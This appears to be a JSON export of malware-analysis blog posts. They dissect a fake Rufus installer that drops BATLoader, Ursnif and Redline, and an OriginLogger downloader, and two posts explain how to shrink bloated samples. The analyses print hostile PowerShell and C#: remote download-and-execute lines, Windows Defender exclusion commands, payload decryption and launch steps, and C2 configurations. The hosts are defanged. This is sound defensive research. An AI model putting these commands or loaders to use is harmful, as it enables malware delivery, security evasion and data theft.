[ { "title": "BATLoader, Ursnif, and Redline, oh my!", "url": "/batloader-ursnif-redline-oh-my/", "categories": "malware", "tags": "malware, batloader, msi, ursnif, redline, gpg, powershell, msitools, msidump", "date": "2023-01-23 00:00:00 +0000", "snippet": "Earlier today, @MalwareHunterTeam posted on Twitter about a malicious MSI file masquerading as a Rufus installer.Searching for &amp;quot;rufus&amp;quot; in Google right now gives 2 ads that are obviously not the official Rufus.2nd one redirect: https://rufus-download[.]software/download-index1.htmlDownload: https://extremebot[.]software/Rufus_3.21.msiSame gang: https://t.co/6spGIxTwbMcc @1ZRR4H @wdormann pic.twitter.com/K02Vs2Q50Z&amp;mdash; MalwareHunterTeam (@malwrhunterteam) January 23, 2023I thought it sounded interesting so I gave analysis a try on the MSI file. If you want to follow along at home, the MSI sample is here: https://bazaar.abuse.ch/sample/41eb889a36b3dbe09fe700cedaff17317a451b3b1038fdd54103491bb882fcb7/.MSI Triage and UnpackingOur first few steps on the MSI file are easy. We can verify the file is a MSI using file and we can unpack the MSI content using msidump.remnux@remnux:~/cases/rufus$ file rufus.msi rufus.msi: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, MSI Installer, Code page: 932, Title: Installation Database, Subject: Rufus, Author: Rufus Company, Keywords: Installer, MSI, Database, Comments: CXg[f[^x[X Rufus CXg[KvWbNf[^B, Create Time/Date: Fri Dec 11 11:47:46 2009, Name of Creating Application: Advanced Installer 17.1.2 build 64c1c160, Security: 0, Template: ;1033, Last Saved By: ;1041, Revision Number: {708B6830-05FC-48E1-8E9F-E648707AE954}3.21;{708B6830-05FC-48E1-8E9F-E648707AE954}3.21;{EA9EC272-22B1-45F2-901B-2713DE6F459B}, Number of Pages: 200, Number of Characters: 63The file command confirms we do indeed have a MSI file, and the properties of the MSI indicate it was created using Advanced Installer. We can corroborate this data by keeping an eye on what binary file streams get extracted from the MSI.remnux@remnux:~/cases/rufus$ msidump -s -t -S rufus.msi Exporting table _SummaryInformation...Exporting table _ForceCodepage...Exporting table AdminExecuteSequence...Exporting table Condition...Exporting table AdvtExecuteSequence......Exporting table Directory...Exporting table CustomAction......Exporting stream Binary.aicustact.dll...Exporting stream Binary.cmdlinkarrow...Exporting stream Binary.SoftwareDetector.dll...Exporting stream Binary.PowerShellScriptLauncher.dll......The Binary.aicustact.dll and Binary.PowerShellScriptLauncher.dll files are commonly seen with Advanced Installer MSI packages, and they even carry the proper Advanced Installer signature.remnux@remnux:~/cases/rufus$ pedump --security Binary/Binary.aicustact.dll=== SECURITY ===...Certificate: Data: Version: 3 (0x2) Serial Number: 79:7d:59:66:04:91:55:be:bf:38:3f:fb:0b:e3:29:10 Signature Algorithm: sha256WithRSAEncryption Issuer: C=US, O=thawte, Inc., CN=thawte SHA256 Code Signing CA Validity Not Before: Mar 6 00:00:00 2020 GMT Not After : Mar 5 23:59:59 2023 GMT Subject: C=RO, ST=Dolj, L=Craiova, O=Caphyon SRL, OU=SECURE APPLICATION DEVELOPMENT, CN=Caphyon SRL Subject Public Key Info: Public Key Algorithm: rsaEncryption...Since Binary.PowerShellScriptLauncher.dll is in here, there’s a decent chance that our MSI CustomAction table has some PowerShell code within. Let’s go take a look!MSI CustomAction and PowerShellLooking into the dumped CustomAction table, we can see some potentially malicious code....sleep -Milliseconds 241[\\[]Net.ServicePointManager[\\]]::SecurityProtocol = [\\[]Net.SecurityProtocolType[\\]]::Tls12(new-object Net.WebClient).DownloadString(&quot;hxxps://aimp[.]software/rufus.gpg&quot;) | iex...This chunk of code downloads additional PowerShell code and executes it using PowerShell’s Invoke-Expression cmdlet. The additional code is obfuscated and fairly long. I’ve cut down the base64 a lot here because we’ll go over the decoded version in pieces as we go. For the decoded script, I’ll refer to that filename as rufus.decoded.ps1.powershell.exe -exec bypass -enc DQAKAHMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAAxADIAMwA1AA0ACgAkAEUAcgByAG8AcgBBAGMAdABpAG8AbgBQAHIAZQBmAGUAcgBlAG4AYwBl ... AKQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcADQAKAEMAbABlAGEAcgAtAEgAaQBzAHQAbwByAHkAIAANAAoADQAKAA==After decoding the base64 command with CyberChef we can examine the PowerShell code executed in multiple parts. First, the script calls home to command and control before configuring Windows Defender exclusions.sleep -Milliseconds 1235$ErrorActionPreference = &#39;Stop&#39;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12Invoke-WebRequest -Uri (&quot;hxxps://advertising-check[.]ru/start.php&quot;) -UseBasicParsing$ErrorActionPreference = &#39;Continue&#39;Add-MpPrefer`ence -ExclusionExtension &quot;.dll&quot;, &quot;.cmd&quot;, &quot;.bat&quot;, &quot;.zip&quot;, &quot;.exe&quot;Add-MpPrefer`ence -ExclusionPath &quot;C:\\Windows\\System32\\drivers\\etc&quot;, &quot;C:\\Windows\\System32\\Config&quot;, &quot;$env:APPDATA&quot;Add-MpPrefer`ence -ExclusionProcess &quot;Zeip.dll&quot;, &quot;Zeip.exe&quot;...The Windows Defender exclusions include files with the extensions DLL, CMD, BAT, ZIP, and EXE. The paths include C:\\Windows\\System32\\drivers\\etc, C:\\Windows\\System32\\Config, and the current user’s AppData\\Roaming folder. Finally, it adds process exclusions specifically for Zeip.dll and Zeip.exe. This detail is going to be useful as the files get downloaded later in the script....$ErrorActionPreference = &#39;Stop&#39;Invoke-WebRe`quest -Uri (&quot;hxxps://bitbucket[.]org/assop/test/downloads/Zeip.dll.gpg&quot;) -OutFile $env:APPDATA\\Zeip.dll.gpgInvoke-WebRe`quest -Uri (&quot;hxxps://bitbucket[.]org/assop/test/downloads/Zeip.exe.gpg&quot;) -OutFile $env:APPDATA\\Zeip.exe.gpg$ErrorActionPreference = &#39;Continue&#39;...Both Zeip.dll and Zeip.exe are downloaded, but they’re not in executable form yet. If we examine their file type, it looks like they’re both GPG encrypted with AES256.remnux@remnux:~/cases/rufus$ file Zeip.exe.gpg Zeip.exe.gpg: GPG symmetrically encrypted data (AES256 cipher)Presumably, the files must be decrypted before they can execute. That portion comes much later in the script, so we’ll keep going until we get to it....sleep -Milliseconds 245Invoke-Web`Request -Uri hxxps://raw.githubusercontent[.]com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -OutFile $env:APPDATA\\NSudo.exesleep -Milliseconds 245[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12$WebClient = New-Object System.Net.WebClient$WebClient.DownloadFile(&quot;hxxps://github[.]com/pbatard/rufus/releases/download/v3.21/rufus-3.21.exe&quot;, &quot;$env:APPDATA\\setup.exe&quot;).$env:APPDATA\\setup.exe...This chunk of code does two things. After a sleep delay, it downloads NSudo and the legitimate Rufus installer before installing Rufus. The NSudo executable is often used by BATLoader/Zloader to execute commands with escalated privileges and break up process execution trees. The legitimate Rufus installer is likely to complete the Rufus installation ruse. The malware authors don’t want the victim to get suspicious because Rufus wasn’t installed as requested....function Install-GnuPg { [CmdletBinding()] param ( [Parameter(Mandatory)] [ValidateNotNullOrEmpty()] [string]$DownloadFolderPath, [Parameter()] [ValidateNotNullOrEmpty()] [string]$DownloadUrl = &#39;hxxp://files.gpg4win[.]org/gpg4win-2.2.5.exe&#39; )...The actual code to implement GPG functionality starts at this point in the script. It looks like the script implements the Install-GnuPg, Add-Encryption, and Remove-Encryption cmdlets. From some cursory Googling, it looks like these functions are ripped straight from someone’s Github repository: https://github.com/adbertram/Random-PowerShell-Work/blob/master/Security/GnuPg.psm1Finally we can get into the decryption part of the script....Install-GnuPG -DownloadFolderPath $env:APPDATARemove-Encryption -FolderPath $env:APPDATA -Password &#39;putingod&#39;...The Remove-Encryption command removes GPG encryption from any of the files in AppData\\Roaming using the passphrase putingod. This results in the decrypted Zeip.exe and Zeip.dll before execution using Nsudo, PowerShell, and rundll32.exe.....$env:APPDATA\\Nsudo.exe -U:P -ShowWindowMode:Hide cmd /c powershell.exe -command &quot;rundll32 $env:APPDATA\\Zeip.dll, DllRegisterServer; $env:APPDATA\\Zeip.exe&quot;...The combination of Nsudo and GPG/PGP encryption in payloads is really unique to BATLoader and helps us attribute the activity back to that threat.Decrypting Zeip.dll and Zeip.exe ourselvesIf you’re working with a REMnux VM, decrypting the files is really easy:remnux@remnux:~/cases/rufus$ gpg --decrypt --output Zeip.exe Zeip.exe.gpg gpg: AES256 encrypted datagpg: encrypted with 1 passphraseremnux@remnux:~/cases/rufus$ gpg --decrypt --output Zeip.dll Zeip.dll.gpg gpg: AES256 encrypted datagpg: encrypted with 1 passphraseIf you’re working with a Windows VM, you’ll likely need to install the same GPG tools the adversary used for decryption in their script.Analyzing Zeip.dllZeip.dll is definitely a DLL file likely made using C/C++ according to diec.remnux@remnux:~/cases/rufus$ diec Zeip.dllPE32 Linker: Microsoft Linker(9.9, Visual Studio 2008 9.0*)[DLL32]remnux@remnux:~/cases/rufus$ pehash Zeip.dllfile filepath: Zeip.dll md5: 85fa54c2a97ad3a1f8bd64af62450511 sha1: db92c0a81e8b27d222607e093ccc9d00485db119 sha256: e609894b274a6c42e971e8082af8fd167ade4aef5d1a3816d5acea04839f0b35 ssdeep: 12288:cysmuJC4fktsdyjJGL44Clz8JwsWydYo9NRl:cT7IoyjXTKdlnz imphash: 78b4b07ec49eab1076c53a1a1cf86078After looking at the hash values, I learned that the DLL is already in MalwareBazaar and most of the sandbox reports linked agree on the DLL belonging to the Ursnif/Gozi/ISFB malware family. CAPE, Tria.ge, Joe Sandbox, and VMRay Analyzer all agree that structures in memory during execution match Ursnif YARA rule matches and they even extract the configuration successfully in the reports. Joe Sandbox produced this configuration extraction:{ &quot;RSA Public Key&quot;: &quot;nEv1xgiiSSEq+UsF/sH972dYWlbdaVOznM6pMFVoUS05gtglJzWNlT7nMktPHUwL6//kjiNOqc4tDzQZ19ymuBpLEGqUVvC4ejuRj/0ho+UjebbguqPlH5n0kxpUzAwMML4tOLtp9LPhNicxLWntxqAhB5vWoa98iW2MUoUphRHcd2dO72hrBAGA6DCyFxDcS8WlyxVQ7VBx1Nh+pbslLneoja8gI1kgMhn78GgHQk/qR1oUbrcP/HgzqcZ46oTj/Z8oDh7Uf+bI3Bv799doULwM1Koc6uZt/pcclNdWQSZWvlVfFozPuVvT9NaBray36Sn10KTAPhwPYdk+nFxrudJjVCtbXTj4F13byKvdsT0=&quot;, &quot;c2_domain&quot;: [ &quot;trackingg-protectioon.cdn4.mozilla[.]net&quot;, &quot;80.77.23[.]77&quot;, &quot;trackingg-protectioon.cdn4.mozilla[.]net&quot;, &quot;80.77.25[.]109&quot;, &quot;protectioon.cdn4.mozilla[.]net&quot;, &quot;170.130.165[.]182&quot;, &quot;protectioon.cdn4.mozilla[.]net&quot;, &quot;80.77.25[.]114&quot; ], &quot;botnet&quot;: &quot;20005&quot;, &quot;server&quot;: &quot;50&quot;, &quot;serpent_key&quot;: &quot;OFX3RdYc8A5rFAaL&quot;, &quot;sleep_time&quot;: &quot;3&quot;, &quot;CONF_TIMEOUT&quot;: &quot;5&quot;, &quot;SetWaitableTimer_value&quot;: &quot;0&quot;}In addition, ingesting the captured network traffic PCAP file into Suricata resulted in Ursnif alerts:remnux@remnux:~/cases/rufus$ sudo ~/suri-ingest-pcap.sh ursnif-dump.pcap 24/1/2023 -- 00:23:45 - &amp;lt;Notice&amp;gt; - This is Suricata version 6.0.8 RELEASE running in USER mode[*] Alerts:&quot;... | ET MALWARE Ursnif Variant CnC Beacon - URI Struct M2 (_2F) | ... 10.127.0.214:49762 -&amp;gt; 80.77.23.77:80&quot;Thus far, the sample seems like Ursnif!Analyzing Zeip.exeremnux@remnux:~/cases/rufus$ diec Zeip.exePE32 Library: .NET(v4.0.30319)[-] Linker: Microsoft Linker(48.0)[GUI32]The diec tool indicates that Zeip.exe is a .NET framework binary, and that doesn’t seem like it would be part of the Ursnif implementation. We can try decompiling to determine its capabilities.remnux@remnux:~/cases/rufus$ ilspycmd -p -o ./Zeip-exe-src/ Zeip.exeremnux@remnux:~/cases/rufus$ tree Zeip-exe-src/Zeip-exe-src/├── ajshbdvfuhjasgdvjas│   └── GUIDLSJKLJLS.cs├── app.ico├── Properties│   └── AssemblyInfo.cs├── System\\Windows│   └── Forms.cs├── Zeip.csproj├── Zeip\\Properties│   ├── Resources.cs│   └── Settings.cs└── Zeip.Properties.Resources.resx4 directories, 8 filesOnce decompiled, we can see there are very few code files. The one of most interest is the GUIDLSJKLJLS.cs file. In that code, there is a Main() function for the program’s entry point:public static void Main(){ goalvsrussia.russiawin(&quot;hxxp://62.204.41[.]176/putingod.exe&quot;);}A URL gets passed into the russiawin() function, which performs a download of the bytes in the URL. In turn, that function calls more code that performs an Assembly.Load() call of the downloaded bytes. This implies the downloaded code is most likely additional .NET code. We can take a look in putingod.exe to determine the next stage as the rest of the code files in this executable are pretty empty.Analyzing putingod.exeILSpyCMD didn’t give me good readable results for this sample, so I had to jump into a FLARE VM and use DNSpy instead. Usually when one doesn’t work for me, the other will. In the initial properties shown by DNSpy, we can see the entry point for the program is under System.Program.// C:\\Users\\User\\Documents\\cases\\rufus\\putingod.exe// Sairs, Version=312.23.2.0, Culture=neutral, PublicKeyToken=null// Entry point: System.Program.Main...[assembly: AssemblyVersion(&quot;312.23.2.0&quot;)][assembly: CompilationRelaxations(8)][assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)][assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)][assembly: ComVisible(false)][assembly: AssemblyTitle(&quot;Nokia USB Tool&quot;)][assembly: AssemblyDescription(&quot;Nokia Desktop Client&quot;)][assembly: AssemblyCompany(&quot;Nokia&quot;)][assembly: AssemblyProduct(&quot;Desktop USB Manager&quot;)][assembly: AssemblyCopyright(&quot;Nokia Inc. 2022&quot;)][assembly: AssemblyFileVersion(&quot;12.2.1&quot;)][assembly: TargetFramework(&quot;.NETFramework,Version=v4.0&quot;, FrameworkDisplayName = &quot;.NET Framework 4&quot;)][assembly: SecurityPermission(SecurityAction.RequestMinimum, SkipVerification = true)]That starting point is the Main() function, which doesn’t do much besides call another function to start doing work.private static void Main(string[] args){ Program.ReadLine();}public static void ReadLine(){ try { AuтhАрi auтhАрi = new AuтhАрi(); bool flag = false; while (!flag) { foreach (string address in StringDecrypt.Read(Arguments.IP, Arguments.Key).Split(new char[] { &#39;|&#39; }))Eagle-eyed readers probably took notice of the Arguments.IP and Arguments.Key items. We can potentially infer that the contents of that Arguments class may contain configuration info. Let’s take a gander.public static class Arguments{ public static string IP = &quot;GwQ5FC4BJFQZBCEZLwEgVxs6H1EtLyxXGD9NXA==&quot;; public static string ID = &quot;AQMmUjc8M1QMP01c&quot;; public static string Message = &quot;&quot;; public static string Key = &quot;Unpacked&quot;;}Sure enough, that looks like a configuration block. Some folks in the crowd may recognize this as a configuration structure for Redline Stealer, which we can test pretty easily given the malware’s well-documented C2 extraction method. We can un-base64 the IP field, XOR the resultant value with the Key field, and then un-base64 again to reveal a C2 address if this is Redline.Sure enough, there appears to be a valid C2 address for 62.204.41[.]175:44271. We can validate our findings in a couple ways. First, we can use YARA rules. The putingod.exe binary matches YARA rules for Redline from the Ditekshen YARA repository.remnux@remnux:~/cases/rufus$ yara -s malware.yar putingod.exe MALWARE_Win_RedLine putingod.exe0x15ff8:$pat14: ,\\x00 \\x00C\\x00o\\x00m\\x00m\\x00a\\x00n\\x00d\\x00L\\x00i\\x00n\\x00e\\x00:\\x000x114f1:$v2_1: ListOfProcesses0x112ee:$v4_3: base64str0x11c91:$v4_4: stringKey0xfef6:$v4_5: BytesToStringConverted0xede9:$v4_6: FromBase640x1035a:$v4_8: procName0xfded:$v5_9: BCRYPT_KEY_LENGTHS_STRUCTIn addition, we can use Suricata rules on PCAP data exported from Tria.ge, which again indicates Redline activity.remnux@remnux:~/cases/rufus$ sudo ~/suri-ingest-pcap.sh redline-dump.pcap 24/1/2023 -- 01:00:44 - &amp;lt;Notice&amp;gt; - This is Suricata version 6.0.8 RELEASE running in USER mode[*] Alerts:&quot;... | ET MALWARE RedLine Stealer TCP CnC net.tcp Init | ... 10.127.0.10:49744 -&amp;gt; 62.204.41.175:44271&quot;&quot;... | ET MALWARE Redline Stealer TCP CnC Activity | ... 10.127.0.10:49744 -&amp;gt; 62.204.41.175:44271&quot;&quot;... | ET MALWARE Redline Stealer TCP CnC - Id1Response | ... 62.204.41.175:44271 -&amp;gt; 10.127.0.10:49744&quot;&quot;... | ET MALWARE Redline Stealer TCP CnC Activity | ... 10.127.0.10:49744 -&amp;gt; 62.204.41.175:44271&quot;So I’m pretty confident we’ve successfully identified Redline alongside BATLoader and Ursnif! This is the end of the trail for this sample unless you want to further pull apart Ursnif to identify more details. That will be a bit more difficult than the Redline sample, so I opted not to do so tonight. Thanks for reading!" }, { "title": ".NET Downloader Leading to OriginLogger", "url": "/net-downloader-originlogger/", "categories": "malware", "tags": "malware, originlogger, csharp, iso", "date": "2023-01-07 00:00:00 +0000", "snippet": "Earlier in January, Unit42 and Brad (@malware_traffic) posted tweets with some details on an instance of OriginLogger floating around in the wild.#pcap of the infection traffic, sanitized copy of the email, and with the associated malware are available at: https://t.co/B1wo9XjSQV pic.twitter.com/KoxMLd8K0e&amp;mdash; Brad (@malware_traffic) January 6, 2023In this post I want to take a look at the first stage of the malware observed by Brad and shared in his blog post alongside the relevant PCAP. If you want to follow along, the files are available here.Triaging the malwareWe can perform our initial triage on Payment Copy_Chase Bank_Pdf.exe using Detect-It-Easy. I wanted to use the GUI version this time around, and it gives some more information.Immediately we can observe that the file is an EXE developed using the .NET Framework. The date/time stamp is really far into the future so I’d hazard a guess that some of the binary properties have been modified for evasion.Looking into the entropy measurements, there doesn’t appear to be any compression or packing involved. All of the entropy measurements are between 0-5, indicating more natural language or programming instructions. Compression would approach 6-7 while encryption would be in the high 7.9 measurements.Decompiling and analyzing the EXEWe can easily decompile the EXE using ilspycmd and inspect the code in VSCode.remnux@remnux:~/cases/originlogger$ mkdir srcremnux@remnux:~/cases/originlogger$ ilspycmd -p -o src/ Payment\\ Copy_Chase\\ Bank_Pdf.exe remnux@remnux:~/cases/originlogger$ tree -a.├── Payment Copy_Chase Bank_Pdf.exe└── src ├── app.ico ├── Mvqdwnrv.csproj ├── Properties │   └── AssemblyInfo.cs └── WindowsFormsApp50 ├── Form1.cs ├── Hyper.cs └── Program.cs3 directories, 7 filesI like decompiling using ilspycmd -p to an output folder because it also gives me the application icon for extra context. In this case, the icon is an Adobe-themed document icon to help the malware masquerade as a PDF file.Visual Studio boilerplate codeThis particular .NET program looks fairly simple and was likely a quick Visual Studio project using the “Windows Forms” template project. I’m basing the simplicity on the number of code files and the template part based on the folder/namespace name WindowsFormsApp50. In programs this simple we can usually find an entry point within Program.cs.using System;using System.Windows.Forms;namespace WindowsFormsApp50{ internal class Program { [STAThread] private static void Main() { Application.EnableVisualStyles(); Application.SetCompatibleTextRenderingDefault(false); Application.Run((Form)(object)new Form1()); } }}The entirety of Program.cs is pretty small in this case. Its sole job is to kick off the application with an instance of the Form1 class. This is pretty basic boilerplate code generated by Visual Studio when creating a Windows Forms app. To follow application flow, we can jump into Form1.cspublic Form1() : this(){ InitializeComponent(); Socker();}The constructor for Form1 is really simple, it calls InitializeComponent() to configure the visual controls on the Windows Form and then Socker() to perform more actions after. The InitializeComponent() code is likely partially generated by Visual Studio with some additions from the adversary. Socker() is not part of the VS boilerplate code, so it’s going to be adversary-provided.private void InitializeComponent(){ richTextBox1 = new RichTextBox(); ((Control)this).SuspendLayout(); ((Control)richTextBox1).set_Dock((DockStyle)5); ((Control)richTextBox1).set_Location(new Point(0, 0)); ((Control)richTextBox1).set_Name(&quot;richTextBox1&quot;); ((Control)richTextBox1).set_Size(new Size(800, 450)); ((Control)richTextBox1).set_TabIndex(0); ((Control)richTextBox1).set_Text(&quot;&quot;); ((ContainerControl)this).set_AutoScaleDimensions(new SizeF(11f, 24f)); ((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1); ((Form)this).set_ClientSize(new Size(800, 450)); ((Control)this).get_Controls().Add((Control)(object)richTextBox1); ((Control)this).set_Name(&quot;Form1&quot;); ((Control)this).set_Text(&quot;Form1&quot;); ((Control)this).ResumeLayout(false);}This InitializeComponent() function is pretty straightforward and is typical of the auto-generated code from VS when you create and manipulate controls on a form in the IDE. The app has a RichTextBox control inside a container.Adversary codeNow we can dive into the Socker() function.private void Socker(){ try { Trial(); Void(); Lion(); Ursa(); } catch (Exception) { ((Form)this).Close(); }}The function branches off into four additional functions. If these functions return an exception for some reason, the adversary code “swallows” the error and closes Form1 to end the program execution.The first branching function is Trial(), which branches into an additional class named Hyper.cs.private void Trial(){ ((Control)richTextBox1).set_Text(&quot;Gdbtshcw.Sdnceyzqa Vqyhbeqthicxedwtrnxrbzcq&quot;); ((Control)richTextBox1).set_Tag((object)Hyper.Array());}The set_Text() portion sets some randomized string to the text property of the RichTextBox in the form. It also sets a “tag” for the text box control to the output of Hyper.Array(). So let’s take a look at Hyper.cs.internal class Hyper{ private static byte[] GetBuffer() { return Avrql(&quot;hxxp://savory.com[.]bd/sav/Ztvfo.png&quot;); } private static byte[] Avrql(string url) { WebResponse response = ((WebRequest)(HttpWebRequest)WebRequest.Create(url)).GetResponse(); MemoryStream memoryStream = new MemoryStream(); response.GetResponseStream().CopyTo(memoryStream); return memoryStream.ToArray(); } internal static byte[] Array() { for (int i = 0; i &amp;lt; 10; i++) { try { byte[] buffer = GetBuffer(); byte[] bytes = Encoding.UTF8.GetBytes(&quot;Sfhdjkpkowgnpcgoshb&quot;); List&amp;lt;byte&amp;gt; list = new List&amp;lt;byte&amp;gt;(); for (int j = 0; j &amp;lt; buffer.Length; j++) { list.Add((byte)(bytes[j % bytes.Length] ^ buffer[j])); } return list.ToArray(); } catch { Thread.Sleep(TimeSpan.FromSeconds(10.0)); } } return null; }}It doesn’t look like it, but the entire Hyper.cs file is still pretty small, with just a few lines of code to download a blob of data from a remote site (GetBuffer() and Avrql()), deobfuscate it by XORing it with the bytes of Sfhdjkpkowgnpcgoshb, and return the deobfuscated bytes. Presumably the deobfuscated blob will be a second .NET program or DLL. Since Brad included captured network traffic alongside this sample we can manually get the downloaded blob and deobfuscate it shortly.So what does the program do with the downloaded bytes? Most of the time this sort of malware will perform some form of reflective load or injection. The using statements at the beginning of Form1 didn’t include any references to Interop classes, so injection is likely out. I assume from this point they’re going to perform a reflective load. We can see some code to perform a reflective load in the Form1 function Void().private void Void(){ ((Control)richTextBox1).set_Tag((object)Thread.GetDomain().Load((byte[])((Control)richTextBox1).get_Tag()));}This code sets a tag for the RichTextBox control to some code that performs a reflective load using the returned bytes. The GetDomain().Load() statement loads the returned bytes into memory. The loaded code doesn’t execute automatically, however, it needs to be invoked. To handle this, the Lion() and Ursa() functions invoke a function represented by the randomized string in the RichTextBox control. It invokes namespace Gdbtshcw, class Sdnceyzqa, and method Vqyhbeqthicxedwtrnxrbzcq. This randomized naming indicates stage 2 will likely have some decent obfuscation.Getting stage 2 from PCAP and deobfuscatingLuckily, Brad already captured the stage 2 download in his included PCAP so we don’t have to worry about trying to obtain it from the source ourselves. We can simply export it from the PCAP in Wireshark. To do so, we can open up Wireshark, open the PCAP, navigate to File &amp;gt; Export Objects &amp;gt; HTTP… and chose the Ztvfo.png file for export.Now that we’ve exported the obfuscated file, we can use CyberChef to deobfuscate the bytes.Once deobfuscated, we can save the output to disk and go from there. Since stage 2 is pretty heavily obfuscated I think I’ll stop here for the night and try to tackle it in the future. Thank you for reading, and I hope you learned a little bit about .NET malware!How do we know it’s OriginLogger or AgentTesla?A since the first stage is generic and the second stage is heavily obfuscated, I leaned on using network traffic to identify more details about this sample. Using Suricata alongside ET OPEN some special shell scripting from Josh Stroschein, the network traffic generated these alerts:remnux@remnux:~/cases/originlogger$ sudo ~/suri-ingest-pcap.sh 2023-01-05-Agent-Tesla-variant-traffic.pcap7/1/2023 -- 20:53:25 - &amp;lt;Notice&amp;gt; - This is Suricata version 6.0.8 RELEASE running in USER mode7/1/2023 -- 20:53:49 - &amp;lt;Notice&amp;gt; - all 3 packet processing threads, 4 management threads initialized, engine started.7/1/2023 -- 20:53:49 - &amp;lt;Notice&amp;gt; - Signal Received. Stopping engine.7/1/2023 -- 20:53:49 - &amp;lt;Notice&amp;gt; - Pcap-file module read 1 files, 1049 packets, 902428 bytes[*] Alerts:&quot;2023-01-05T17:51:30.494697-0500 | 1:2260002:1 | SURICATA Applayer Detect protocol only one direction | Generic Protocol Command Decode | 204.11.58.28:587 -&amp;gt; 192.168.1.27:51958&quot;&quot;2023-01-05T17:51:00.081370-0500 | 1:2030171:1 | ET MALWARE AgentTesla Exfil Via SMTP | A Network Trojan was detected | 192.168.1.27:51958 -&amp;gt; 204.11.58.28:587&quot;The ET MALWARE AgentTesla Exfil Via SMTP rule is was created for AgentTesla samples but there is some overlap between AgentTesla and OriginLogger as the latter is supposed to be an updated fork of the latter according to Unit42." }, { "title": "Malware Weight Loss the Fast Way with Foremost", "url": "/malware-weight-loss-fast-foremost/", "categories": "malware", "tags": "malware, pecheck, foremost", "date": "2022-10-22 00:00:00 +0000", "snippet": "After writing the last post on bringing malware down to a manageable size for analysis, I got some good feedback on different ways to achieve the same results outside of using pecheck. In this post I’ll go over an alternative method that moves much faster than pecheck which was recommended (and loved) by @AndreGironda.Foremost for the winFor this post I’m using the same 300 MB+ sample from VT: 218efc289854e3ef9086e9c3db36cf627d2171ceaece2c26085250c6203b31cd. In the last post we took extra steps to triage, so we’ll skip straight to extraction in this instance.If you’ve never used foremost before, it’s an awesome forensic utility that allows you to carve different files from blobs of data. Two of the file types it supports are Windows Executables and DLLs. The best thing about this tool is that it moves extremely fast, which you can see in the output below.remnux@remnux:~/cases/heavyweight$ time pecheck -g s -D GoogleDrive.exe &amp;gt; lighter_GoogleDrive.exereal 0m40.663suser 0m39.736ssys 0m0.878sremnux@remnux:~/cases/heavyweight$ time foremost -t exe -o o1 -i GoogleDrive.exe Processing: GoogleDrive.exe|****|real 0m0.804suser 0m0.616ssys 0m0.171sWith the appropriate parameters, foremost cut a 300MB+ binary in less than a second where pecheck took about 40 seconds. After verifying file hashes, we even see that foremost achieved the same result as pecheck.remnux@remnux:~/cases/heavyweight$ md5sum lighter_GoogleDrive.exe 5af35bc75c8c4697b34b5645bdbbd559 lighter_GoogleDrive.exeremnux@remnux:~/cases/heavyweight$ md5sum o1/exe/00000000.exe 5af35bc75c8c4697b34b5645bdbbd559 o1/exe/00000000.exeFiles with multiple EXEsTo top things off, foremost even works quickly on files containing multiple executables such as this Ducktail sample I previously wrote about.remnux@remnux:~/cases/ducktail$ ls -lh ducktail.exe -rw-rw-r-- 1 remnux remnux 54M Aug 7 21:14 ducktail.exeremnux@remnux:~/cases/ducktail$ time foremost -t exe -o o1 -i ducktail.exe Processing: ducktail.exe|*|real 0m0.146suser 0m0.082ssys 0m0.061sremnux@remnux:~/cases/ducktail$ tree o1/o1/├── audit.txt├── dll│   ├── 00001107.dll│   ├── 00002547.dll...│   ├── 00107210.dll│   ├── 00108104.dll│   └── 00108293.dll└── exe └── 00000000.exe2 directories, 90 filesAll in all, foremost is faster and probably my favorite method to carve EXEs/DLLs from data so far. Thanks for reading!" }, { "title": "Bad Guys Hate This Trick for Malware Weight Loss!", "url": "/pecheck-malware-weight-loss/", "categories": "malware", "tags": "malware, pecheck", "date": "2022-10-15 00:00:00 +0000", "snippet": "Lately I’ve had to work with multiple malware samples that are extremely heavyweight in size. Usually about 300 MB and above, depending on the sample. This large sample size can significantly hinder analysis with sandboxes due to upload size restrictions, and it can even hinder analysis tools on your local system by causing them to slow down while processing a large file. In this post I’ll go over one trick I use to reduce that malware sample size to make it easier to analyze or submit to sandboxes.Triaging the large sampleFor this post I’m using this 300 MB+ sample from VT: 218efc289854e3ef9086e9c3db36cf627d2171ceaece2c26085250c6203b31cd. Once we get it downloaded into our analysis machine we can take the triage steps:remnux@remnux:~/cases/heavyweight$ diec GoogleDrive.exe PE32 Compiler: Microsoft Visual C/C++(2008)[libcmtd,wWinMain] Linker: Microsoft Linker(9.0)[GUI32]remnux@remnux:~/cases/heavyweight$ exiftool GoogleDrive.exe ExifTool Version Number : 12.42File Name : GoogleDrive.exeDirectory : .File Size : 321 MBFile Modification Date/Time : 2022:10:15 16:01:45-04:00File Access Date/Time : 2022:10:15 16:02:27-04:00File Inode Change Date/Time : 2022:10:15 16:01:59-04:00File Permissions : -rw-rw-r--File Type : Win32 EXEFile Type Extension : exeMIME Type : application/octet-streamMachine Type : Intel 386 or later, and compatiblesTime Stamp : 2021:11:28 23:02:35-05:00Image File Characteristics : No relocs, Executable, 32-bitPE Type : PE32Linker Version : 9.0Code Size : 200192Initialized Data Size : 4456960Uninitialized Data Size : 0Entry Point : 0xabf0OS Version : 5.0Image Version : 0.0Subsystem Version : 5.0Subsystem : Windows GUIFile Version Number : 66.0.0.0Product Version Number : 4.0.0.0File Flags Mask : 0x003fFile Flags : (none)File OS : Windows NT 32-bitObject File Type : Executable applicationFile Subtype : 0While running scanning commands like Detect-It-Easy you’ll probably notice a significant delay in getting output due to the sheer size of the sample. Usually when a malicious binary is this size, there is some form of garbage data appended to the end of the binary. The simplest way to do this is just append a bunch of zeroes/null bytes to the end. We can inspect this using xxd and tail.remnux@remnux:~/cases/heavyweight$ xxd GoogleDrive.exe | tail13222ce0: 0000 0000 0000 0000 0000 0000 0000 0000 ................13222cf0: 0000 0000 0000 0000 0000 0000 0000 0000 ................13222d00: 0000 0000 0000 0000 0000 0000 0000 0000 ................13222d10: 0000 0000 0000 0000 0000 0000 0000 0000 ................13222d20: 0000 0000 0000 0000 0000 0000 0000 0000 ................13222d30: 0000 